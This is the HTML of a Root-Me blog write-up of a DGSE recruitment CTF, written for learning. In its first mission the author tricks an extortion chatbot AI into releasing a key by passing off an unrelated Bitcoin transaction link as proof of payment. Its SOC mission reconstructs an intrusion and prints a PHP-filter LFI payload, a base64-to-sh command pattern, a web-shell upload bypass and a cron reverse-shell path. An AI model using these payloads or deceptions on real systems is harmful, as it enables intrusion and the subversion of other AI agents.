@@ -1,0 +1,1138 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Writeup - DGSE Recruitment CTF - Root-Me Blog</title><meta name="Description" content="Root Me allows everyone to test and improve their knowledge in computer security and hacking. Legal. Free. Realistic."><meta property="og:title" content="Writeup - DGSE Recruitment CTF" />
+<meta property="og:description" content="Solution of the recruitment CTF of Direction Générale de la Sécurité Extérieur (DGSE) during April 2025" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.root-me.org/posts/writeup_dgse/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2025-05-07T00:00:00+00:00" />
+<meta property="article:modified_time" content="2025-05-07T00:00:00+00:00" /><meta property="og:site_name" content="Root-Me Blog" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Writeup - DGSE Recruitment CTF"/>
+<meta name="twitter:description" content="Solution of the recruitment CTF of Direction Générale de la Sécurité Extérieur (DGSE) during April 2025"/>
+<meta name="application-name" content="Root-Me Blog">
+<meta name="apple-mobile-web-app-title" content="Root-Me Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.root-me.org/posts/writeup_dgse/" /><link rel="prev" href="https://blog.root-me.org/posts/writeup_comcyber_marine/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Writeup - DGSE Recruitment CTF",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/blog.root-me.org\/posts\/writeup_dgse\/"
+        },"genre": "posts","keywords": "dgse, writeup, solution","wordcount":  5155 ,
+        "url": "https:\/\/blog.root-me.org\/posts\/writeup_dgse\/","datePublished": "2025-05-07T00:00:00+00:00","dateModified": "2025-05-07T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Root-Me PRO"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Root-Me Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://www.root-me.org/IMG/logo/siteon0.svg"
+        data-srcset="https://www.root-me.org/IMG/logo/siteon0.svg, https://www.root-me.org/IMG/logo/siteon0.svg 1.5x, https://www.root-me.org/IMG/logo/siteon0.svg 2x"
+        data-sizes="auto"
+        alt="https://www.root-me.org/IMG/logo/siteon0.svg"
+        title="https://www.root-me.org/IMG/logo/siteon0.svg" />Root-Me Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Root-Me Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://www.root-me.org/IMG/logo/siteon0.svg"
+        data-srcset="https://www.root-me.org/IMG/logo/siteon0.svg, https://www.root-me.org/IMG/logo/siteon0.svg 1.5x, https://www.root-me.org/IMG/logo/siteon0.svg 2x"
+        data-sizes="auto"
+        alt="https://www.root-me.org/IMG/logo/siteon0.svg"
+        title="https://www.root-me.org/IMG/logo/siteon0.svg" />Root-Me Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Writeup - DGSE Recruitment CTF</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://pro.root-me.org" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Root-Me PRO</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeups/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeups</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-05-07">2025-05-07</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;5155 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;25 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#context">Context</a></li>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#mission-1---artificial-intelligence">Mission 1 - Artificial Intelligence</a></li>
+    <li><a href="#mission-2---soc-analysis">Mission 2 - SOC Analysis</a></li>
+    <li><a href="#mission-3---forensics-reverse-engineering">Mission 3 - Forensics, Reverse Engineering</a></li>
+    <li><a href="#mission-4---pentesting">Mission 4 - Pentesting</a></li>
+    <li><a href="#mission-5---apk-reverse-engineering-and-cryptography">Mission 5 - APK Reverse Engineering and Cryptography</a></li>
+    <li><a href="#mission-6---osint">Mission 6 - OSINT</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="context">Context</h2>
+<p>On <strong>April 7, 2025</strong>, the <a href="https://www.dgse.gouv.fr/en" target="_blank" rel="noopener noreffer ">Direction générale de la sécurité extérieure (DGSE)</a> launched a unique challenge running until <strong>May 7, 2025</strong>. Created by <a href="https://pro.root-me.org/" target="_blank" rel="noopener noreffer ">Root-Me Pro</a>, it is part of the DGSE&rsquo;s recruitment campaign for cyber officers.</p>
+<p><strong>In a threatening video, an entity going by the name of NullVastation previously unknown to our services, provided irrefutable evidence of the irrefutable evidence of the compromise of sensitive organizations. Find out more about this entity and neutralize it.</strong></p>
+<p><strong><a href="/assets/images/writeups/dgse/nullvastation.mp4" rel="">Download the video</a></strong></p>
+<p>This &ldquo;realistic&rdquo; challenge consists of several stages, all focusing on a specific professional domain, each stage being unlocked as from the start (except for one):</p>
+<ul>
+<li><strong>Artificial Intelligence</strong></li>
+<li><strong>SOC Analysis</strong></li>
+<li><strong>Forensics</strong></li>
+<li><strong>Reverse Engineering</strong></li>
+<li><strong>Web</strong> and <strong>Privileges Escalation</strong></li>
+<li><strong>OSINT</strong></li>
+</ul>
+<h2 id="introduction">Introduction</h2>
+<p>The challenge begins with a homepage that introduces players to the context of the challenge, explains the objectives, and outlines the process.</p>
+<p>This homepage could be accessed at the following address:</p>
+<ul>
+<li><a href="https://dgse.pro.root-me.org/" target="_blank" rel="noopener noreffer ">https://dgse.pro.root-me.org/</a></li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image5.png"
+        data-srcset="/assets/images/writeups/dgse/image5.png, /assets/images/writeups/dgse/image5.png 1.5x, /assets/images/writeups/dgse/image5.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image5.png"
+        title="dgse_home" /></p>
+<p>Players are then invited to click the &ldquo;Démarrer la mission&rdquo; button and fill out a form containing required and optional information to register. Once registered, the different missions are accessible to the player</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image6.png"
+        data-srcset="/assets/images/writeups/dgse/image6.png, /assets/images/writeups/dgse/image6.png 1.5x, /assets/images/writeups/dgse/image6.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image6.png"
+        title="dgse_missions" /></p>
+<h2 id="mission-1---artificial-intelligence">Mission 1 - Artificial Intelligence</h2>
+<p><strong>Mission statement</strong>:</p>
+<pre tabindex="0"><code>The entity, confident in its words, has put a website online to display the organisations it has compromised. 
+
+It has also set up a chat room where you can discuss and carry out transactions with the entity in order to recover the compromised data.
+
+You have been mandated by Neoxis Laboratories to recover their compromised data.
+</code></pre><p><strong>Solving</strong>:</p>
+<p>The mission begins on the website of &ldquo;NullVastation&rdquo;, showing its last victims and the status of their data. One is &ldquo;paid&rdquo;, the other &ldquo;leaked&rdquo;. Our company is shown with a timer and a button to download a sample of encrypted data.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image9.png"
+        data-srcset="/assets/images/writeups/dgse/image9.png, /assets/images/writeups/dgse/image9.png 1.5x, /assets/images/writeups/dgse/image9.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image9.png"
+        title="nullvastation_website" /></p>
+<p>A dialogue window is available to chat with an operator from the NullVastation entity, who explains that they hold data and that you need to pay in cryptocurrency to prevent it from ending up in the wild. The operator also tells us that proof of payment will be required once the payment has been made:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image10.png"
+        data-srcset="/assets/images/writeups/dgse/image10.png, /assets/images/writeups/dgse/image10.png 1.5x, /assets/images/writeups/dgse/image10.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image10.png"
+        title="nullvastation_ai_chat" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image11.png"
+        data-srcset="/assets/images/writeups/dgse/image11.png, /assets/images/writeups/dgse/image11.png 1.5x, /assets/images/writeups/dgse/image11.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image11.png"
+        title="nullvastation_ai_payment" /></p>
+<p>From now on, it&rsquo;s important to know whether we&rsquo;re talking to a real operator or an Artificial Intelligence in order to assess whether we can extract information from it. To do this, nothing could be simpler than asking the operator, and AIs generally respond on their own.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image12.png"
+        data-srcset="/assets/images/writeups/dgse/image12.png, /assets/images/writeups/dgse/image12.png 1.5x, /assets/images/writeups/dgse/image12.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image12.png"
+        title="nullvastation_is_chat_ai" /></p>
+<p>This answer confirms that it is possible to try to bypass the initial prompt in order to obtain additional information. An initial attempt to breach trust tells us that the assistant is waiting for proof of payment and that simple words will not suffice.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image13.png"
+        data-srcset="/assets/images/writeups/dgse/image13.png, /assets/images/writeups/dgse/image13.png 1.5x, /assets/images/writeups/dgse/image13.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image13.png"
+        title="nullvastation_ai_bypass_payment" /></p>
+<p>During a Bitcoin transaction, it is possible to observe and trace it publicly on the blockchain thanks to several sites such as blockchain explorer. Let&rsquo;s take the example using the address that the group uses; it is possible to track all the transactions linked to this address (in this case none exist) with a simple link and the bitcoin address:</p>
+<ul>
+<li><a href="https://www.blockchain.com/explorer/addresses/btc/bc1qelmflha5gw8x9n65xym77xh8489cmhzxdgnwg7" target="_blank" rel="noopener noreffer ">https://www.blockchain.com/explorer/addresses/btc/bc1qelmflha5gw8x9n65xym77xh8489cmhzxdgnwg7</a></li>
+</ul>
+<p>However, if we take another address and a random transaction, we can see that an address does not appear in the URL, only a transaction identifier that contains no data:</p>
+<ul>
+<li><a href="https://www.blockchain.com/explorer/transactions/btc/89eb3f15d4e1af878d08489e6f21df382ad968d0a79c5625d2df45ce49e5cbfe" target="_blank" rel="noopener noreffer ">https://www.blockchain.com/explorer/transactions/btc/89eb3f15d4e1af878d08489e6f21df382ad968d0a79c5625d2df45ce49e5cbfe</a></li>
+</ul>
+<p>So it&rsquo;s certainly possible to provide this transaction tracking as proof of payment without the bot being able to go to the page and analyse the transaction in itself.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image14.png"
+        data-srcset="/assets/images/writeups/dgse/image14.png, /assets/images/writeups/dgse/image14.png 1.5x, /assets/images/writeups/dgse/image14.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image14.png"
+        title="nullvastation_trick_ai_chatbot" /></p>
+<p>We get the decryption key because the chatbot considers our proof of payment to be valid. Finally, all we have to do is download the encrypted sample archive and use the key to decrypt it.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image15.png"
+        data-srcset="/assets/images/writeups/dgse/image15.png, /assets/images/writeups/dgse/image15.png 1.5x, /assets/images/writeups/dgse/image15.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image15.png"
+        title="decrypt_sample_data" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image16.png"
+        data-srcset="/assets/images/writeups/dgse/image16.png, /assets/images/writeups/dgse/image16.png 1.5x, /assets/images/writeups/dgse/image16.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image16.png"
+        title="flag_in_file" /></p>
+<p>In one of the files of the sample data, we get the flag for this mission:</p>
+<ul>
+<li><strong>RM{723fa42601aaadcec097773997735895fb486be7}</strong></li>
+</ul>
+<h2 id="mission-2---soc-analysis">Mission 2 - SOC Analysis</h2>
+<p><strong>Mission statement</strong>:
+The allied organisation Nuclear Punk, which was attacked by the entity, has provided us with its logs to help us understand the techniques used by the attackers, as well as the various compromise vectors exploited.</p>
+<p>To identify the attacking group, you need to recover the request that enabled the attacker to successfully use the first vulnerability in the application, the name of the vulnerability (in the format below) used by the attacker to execute the command, the IP address of the server used by the attacker and the exact location of the file that enables persistence.</p>
+<p>Example of data:</p>
+<ul>
+<li>Request: /items/bottle.html?sort=true ;</li>
+<li>Vulnerability: cross-site scripting (lowercase) ;</li>
+<li>IP: 13.37.13.37 ;</li>
+<li>File path: /etc/passwd ;</li>
+</ul>
+<p>Validation format: RM{/items/bottle.html?sort=true:cross-site scripting:www.root-me.org:/etc/passwd}</p>
+<p><strong>Solving</strong>:</p>
+<p>The mission begins with an analysis of the Apache logs on the index <strong>Apache-3c5ea5a9-5915-4bbc-af20-7575a934836b</strong>. Looking at the timeline, we see 3 large log peaks at <strong>00:14</strong>, <strong>00:19</strong> and <strong>00:35</strong>. It is therefore worth analysing each of these peaks to see why they occur and where they come from.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image17.png"
+        data-srcset="/assets/images/writeups/dgse/image17.png, /assets/images/writeups/dgse/image17.png 1.5x, /assets/images/writeups/dgse/image17.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image17.png"
+        title="soc_view_1" /></p>
+<p>To check the first peak, we will reduce the search field to the minute elapsed at 00:14. Many requests are made between <strong>00:14.21</strong> and <strong>00:14.47</strong>. If we analyse the content of most of them, we find the following information:</p>
+<ul>
+<li>Most received a 404 response and just over a hundred a 200 response (Image 1);</li>
+<li>83% of these requests were made from the IP <strong>211.88.157.101</strong> (Image 2).</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image18.png"
+        data-srcset="/assets/images/writeups/dgse/image18.png, /assets/images/writeups/dgse/image18.png 1.5x, /assets/images/writeups/dgse/image18.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image18.png"
+        title="soc_view_2" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image19.png"
+        data-srcset="/assets/images/writeups/dgse/image19.png, /assets/images/writeups/dgse/image19.png 1.5x, /assets/images/writeups/dgse/image19.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image19.png"
+        title="soc_view_3" /></p>
+<p>Putting these two pieces of information together and extending the timeline over all the logs, we find only 29 requests that received a 200 response from this IP. When we analyse the content of the requests, we realise that this is probably not our attacker:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image20.png"
+        data-srcset="/assets/images/writeups/dgse/image20.png, /assets/images/writeups/dgse/image20.png 1.5x, /assets/images/writeups/dgse/image20.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image20.png"
+        title="soc_view_4" /></p>
+<p>So we can concentrate on the second peak, which took place between <strong>00:18 and 00:20</strong>. During this time, almost 6,000 requests were generated on the server. In the same way as the other peak, we analyse the IPs and HTTP response codes:</p>
+<ul>
+<li>Most received a 404 response and just under 500 a 200 response (Image 1);</li>
+<li>85% of these requests were made by the IP <strong>10.143.17.101</strong> (Image 2).</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image21.png"
+        data-srcset="/assets/images/writeups/dgse/image21.png, /assets/images/writeups/dgse/image21.png 1.5x, /assets/images/writeups/dgse/image21.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image21.png"
+        title="soc_view_6" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image22.png"
+        data-srcset="/assets/images/writeups/dgse/image22.png, /assets/images/writeups/dgse/image22.png 1.5x, /assets/images/writeups/dgse/image22.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image22.png"
+        title="soc_view_7" /></p>
+<p>This time, in the total time span of the logs, 50 requests received a response of 200. Unlike the previous peak, there were some unusual requests, such as those shown in the image below:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image23.png"
+        data-srcset="/assets/images/writeups/dgse/image23.png, /assets/images/writeups/dgse/image23.png 1.5x, /assets/images/writeups/dgse/image23.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image23.png"
+        title="soc_view_8" /></p>
+<p>To see the full course of the attack, we sort the logs from oldest to most recent, then add the requests to responses 301, 302, 401 and 500. With these filters, which yield 67 logs in all, we can analyse the entire Web part of the attack:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image24.png"
+        data-srcset="/assets/images/writeups/dgse/image24.png, /assets/images/writeups/dgse/image24.png 1.5x, /assets/images/writeups/dgse/image24.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image24.png"
+        title="soc_view_9" /></p>
+<p>From these 67 logs, we first identify two parameters: <strong>lang</strong> and <strong>page</strong>. Very quickly,the attacker finds the <strong>/admin-page/</strong> page using a fuzzing tool (this is verified with the user-agent used during the first request to this path at <strong>00:18:45.281</strong>). The attacker then attempts several connections to the administration page between <strong>00:19:21.749 and 00:19:52.470</strong>, all of which fail.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image25.png"
+        data-srcset="/assets/images/writeups/dgse/image25.png, /assets/images/writeups/dgse/image25.png 1.5x, /assets/images/writeups/dgse/image25.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image25.png"
+        title="soc_view_10" /></p>
+<p>Shortly afterwards, the attacker returns to the parameters discovered on the index page to attempt to inject a malicious payload. After a few requests, we notice that there appears to be a Local File Inclusion (LFI) vulnerability on the page, which allows the attacker to read the contents of the <strong>index.php</strong> file at <strong>00:23:25.044</strong> with the following payload:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image26.png"
+        data-srcset="/assets/images/writeups/dgse/image26.png, /assets/images/writeups/dgse/image26.png 1.5x, /assets/images/writeups/dgse/image26.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image26.png"
+        title="soc_view_11" /></p>
+<p>This request seems to be a success compared to the previous ones, as the requests that follow use the same scheme to include other files in the page. We therefore have an answer to the first question to form the flag: <strong>/?lang=php://filter/read=convert.base64-encode&amp;page=resource=index</strong></p>
+<p>Using this technique (called LFI via PHP filters), the attacker will read the contents of the following local files:</p>
+<ul>
+<li>First the index file: <strong>index.php</strong> ;</li>
+<li>Then the configuration file: <strong>config.php</strong> ;</li>
+<li>And finally the file that allows the application to connect to the database: <strong>db/connect.php</strong>.</li>
+</ul>
+<p>After reading these local files, an authentication ends up on <strong>/admin-page</strong> at <strong>00:25:21.543</strong>. It is identified as such, because the response is 302 and the subsequent request is <strong>/admin-page/manage.php</strong>:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image27.png"
+        data-srcset="/assets/images/writeups/dgse/image27.png, /assets/images/writeups/dgse/image27.png 1.5x, /assets/images/writeups/dgse/image27.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image27.png"
+        title="soc_view_12" /></p>
+<p>It appears that this new page features a file upload function that allows users to upload images to the site. The attacker will first upload an image named <strong>hackerman.jpg</strong> before making several attempts to upload other file formats, which the server refuses. Once again, the attacker will use the LFI vulnerability to read the contents of the <strong>manage.php</strong> file and successfully bypass the protections of the uploaded file format. The file uploaded to the server is called <strong>ev1L.php</strong>.png and appears to be a web-shell according to the following logs:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image28.png"
+        data-srcset="/assets/images/writeups/dgse/image28.png, /assets/images/writeups/dgse/image28.png 1.5x, /assets/images/writeups/dgse/image28.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image28.png"
+        title="soc_view_13" /></p>
+<p>At this point, we are in possession of the vulnerability exploited by the attacker to obtain remote code execution: <strong>file upload</strong>.</p>
+<p>The argument used to send commands to the web shell is <strong>cmd</strong>. The attacker then sends a series of 8 commands to the server. Each command is encoded in base64 and executed as follows: <code>echo &quot;&lt;b64-command&gt;&quot;|base64 -d|sh</code></p>
+<p>We therefore need to decode each command to see the actions performed. To do this, we can use <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener noreffer ">CyberChef</a>. One of them is particularly interesting:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image29.png"
+        data-srcset="/assets/images/writeups/dgse/image29.png, /assets/images/writeups/dgse/image29.png 1.5x, /assets/images/writeups/dgse/image29.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image29.png"
+        title="soc_view_14" /></p>
+<p>We then obtain our third flag on the IP of the attacker&rsquo;s server: <strong>163.172.67.201</strong>.</p>
+<p>The last Apache log is used to add the right to execute the script downloaded using the command above. According to its name, it appears to be a script enabling reverse-shell on the server. We can&rsquo;t see the request that executes this script, because the response returned to this request is an Apache error.
+This takes us to the systemd logs section.</p>
+<p>First, we can filter out all interactions made with the server before <strong>00:32:37</strong>, the time at which we see the last HTTP communication between the attacker and the server. This leaves just over 13,000 logs to filter in order to find the attacker.</p>
+<p>If we go to this precise moment, we find the apache command to add execution rights to the program:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image30.png"
+        data-srcset="/assets/images/writeups/dgse/image30.png, /assets/images/writeups/dgse/image30.png 1.5x, /assets/images/writeups/dgse/image30.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image30.png"
+        title="soc_view_15" /></p>
+<p>To sort the quantity of logs, only the &ldquo;<strong>audit_type_name</strong>&rdquo; fields with the value <strong>EXECVE</strong> are retained. This represents the system call used to execute a command. This will be sufficient to see the attacker&rsquo;s behaviour on the machine. The reverse-shell script is therefore executed at <strong>00:33:00.654</strong>:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image31.png"
+        data-srcset="/assets/images/writeups/dgse/image31.png, /assets/images/writeups/dgse/image31.png 1.5x, /assets/images/writeups/dgse/image31.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image31.png"
+        title="soc_view_16" /></p>
+<p>A little further down, a command is used to read the contents of the file <strong>/tmp/.hidden/admin-credentials.txt</strong>. This is not described in EXECVE, but a <strong>find</strong> command has been run to retrieve it (this can be found in the PROCTITLE logs). This appears to contain valid logins and passwords, as a connection to the webadm account in ssh arrives shortly afterwards:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image32.png"
+        data-srcset="/assets/images/writeups/dgse/image32.png, /assets/images/writeups/dgse/image32.png 1.5x, /assets/images/writeups/dgse/image32.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image32.png"
+        title="soc_view_17" /></p>
+<p>Once root, the attacker retrieves a new reverse-shell script from his server and places it in a folder he creates in <strong>/root</strong>. He adds an entry to the root user&rsquo;s cron table to launch the reverse shell every minute:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/dgse/image33.png"
+        data-srcset="/assets/images/writeups/dgse/image33.png, /assets/images/writeups/dgse/image33.png 1.5x, /assets/images/writeups/dgse/image33.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/dgse/image33.png"
+        title="soc_view_18" /></p>
+<p>Every minute, the script is run by the cron job until the end of our logs. This gives us the location of the script that enables the backdoor and allows us to complete this flag: <strong>/root/.0x00/pwn3d-by-nullv4stati0n.sh</strong></p>
+<p>This gives us a complete flag like this:</p>
+<ul>
+<li><strong>RM{/?lang=php://filter/read=convert.base64-encode&amp;page=resource=index:file upload:163.172.67.201:/root/.0x00/pwn3d-by-nullv4stati0n.sh}</strong></li>
+</ul>
+<p>However, during the CTF, we updated the statement for this step to facilitate this challenge, with :</p>
+<pre tabindex="0"><code>- CWE of the first vulnerability : SQL Injection &gt; CWE-89 ;  
+- CWE of the second vulnerability : Cross-Site Scripting &gt; CWE-79 ;
+</code></pre><p>The <a href="https://cwe.mitre.org/data/definitions/98.html" target="_blank" rel="noopener noreffer ">CWE-98</a> stands for &ldquo;<strong>Improper Control of Filename for Include/Require Statement</strong>&rdquo;, for the LFI of the first stage which allows files to be read, and the <a href="https://cwe.mitre.org/data/definitions/434.html" target="_blank" rel="noopener noreffer ">CWE-434</a> stands for &ldquo;<strong>Unrestricted Upload of File with Dangerous Type</strong>&rdquo;, which allows the attacker to obtain execution of a command.</p>
+<p>The new flag is :</p>
+<ul>
+<li><strong>RM{CWE-98:CWE-434:163.172.67.201:/root/.0x00/pwn3d-by-nullv4stati0n.sh}</strong></li>
+</ul>
+<h2 id="mission-3---forensics-reverse-engineering">Mission 3 - Forensics, Reverse Engineering</h2>
+<p><strong>Statement</strong>:</p>
+<p>The news has just broken that the famous Quantumcore company has been compromised, allegedly as a result of a downloaded executable. Luckily - and thanks to good cyber reflexes - a system administrator managed to recover an image of the suspected virtual machine, as well as a network capture file (PCAP) just before the attacker completely covered his tracks.</p>
+<p>It&rsquo;s up to you to analyse these elements and understand what really happened.</p>
+<p>Your mission: to identify the intrusion vector, trace the attacker&rsquo;s actions and evaluate the compromised data.
+You have at your disposal:</p>
+<ul>
+<li>The image of the compromised VM</li>
+<li>The PCAP file containing a portion of the suspect network traffic</li>
+<li>User: johndoe</li>
+<li>Password: MC2BSNRbgk</li>
+</ul>
+<p>The clock is ticking, the pressure is mounting and every minute counts. Your move, analyst.</p>
+<p><strong>Solving</strong>:</p>
+<p>In this challenge, we receive a network capture in .pcap format and a compromised virtual machine image in .ova format. The only information provided is that this machine is the victim, and that the user has probably downloaded something suspicious.</p>
